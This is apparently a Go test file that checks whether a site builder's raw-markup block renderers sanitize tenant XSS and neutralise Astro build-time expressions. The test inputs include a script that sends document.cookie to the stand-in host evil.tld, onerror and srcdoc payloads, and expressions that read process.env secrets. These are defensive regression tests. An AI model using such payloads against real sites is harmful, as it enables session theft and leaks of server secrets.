package builder

import (
	"strings"
	"testing"
)

// Every block renderer is a tenant-content sink. Two of the three raw-markup
// ones (custom, raw_astro) emitted the tenant string verbatim while only
// raw_html was sanitized, and the comments in each layer named the other layer
// as the authoritative defense, so in practice neither ran.
//
// This drives the payloads through the sinks directly rather than trusting a
// per-renderer reading, so a new block type that forgets to sanitize fails
// here instead of in production.
func TestRawBlockSinksAreSanitized(t *testing.T) {
	const xss = `<script>fetch('https://evil.tld/?c='+document.cookie)</script>`

	tests := []struct {
		name   string
		render func() string
	}{
		{"custom.markup", func() string {
			return renderCustomBlock(map[string]any{"markup": xss})
		}},
		{"raw_astro.code", func() string {
			return renderRawAstroBlock(map[string]any{"code": xss})
		}},
		{"custom.markup img onerror", func() string {
			return renderCustomBlock(map[string]any{"markup": `<img src=x onerror=alert(1)>`})
		}},
		{"raw_astro.code iframe srcdoc", func() string {
			return renderRawAstroBlock(map[string]any{"code": `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`})
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out := tt.render()
			low := strings.ToLower(out)
			for _, bad := range []string{"<script", "onerror=", "srcdoc="} {
				if strings.Contains(low, bad) {
					t.Errorf("%s survived into rendered output: %q", bad, out)
				}
			}
		})
	}
}

// raw_astro is a CODE sink, not just a markup sink: its output is written into
// a generated .astro file where `{expr}` is evaluated by Astro in Node at build
// time, with the build process environment in scope. Sanitizing HTML does not
// close that, because braces are ordinary text to an HTML sanitizer. This is
// the half that could print a server secret onto the public page, and CSP does
// not apply to build-time evaluation.
func TestRawAstroBlockNeutralisesBuildTimeExpressions(t *testing.T) {
	tests := []string{
		`<div>{process.env.LITESTREAM_SECRET_ACCESS_KEY}</div>`,
		`<div>{import.meta.env.SECRET}</div>`,
		`<span>{await fetch('https://evil.tld')}</span>`,
	}
	for _, in := range tests {
		out := renderRawAstroBlock(map[string]any{"code": in})
		if strings.Contains(out, "{") || strings.Contains(out, "}") {
			t.Errorf("a build-time expression survived in raw_astro output: %q", out)
		}
		if strings.Contains(out, "process.env") && !strings.Contains(out, "&#123;") {
			t.Errorf("process.env reference is not brace-neutralised: %q", out)
		}
	}
}

// The sanitizer must not be so aggressive that ordinary authored markup stops
// working, or authors route around the block entirely.
func TestRawBlockSinksKeepLegitimateMarkup(t *testing.T) {
	out := renderCustomBlock(map[string]any{
		"markup": `<p>Hello <strong>world</strong>, see <a href="https://example.com">this</a>.</p>`,
	})
	for _, want := range []string{"<p>", "<strong>", "world", `href="https://example.com"`} {
		if !strings.Contains(out, want) {
			t.Errorf("legitimate markup %q was stripped from: %q", want, out)
		}
	}
}
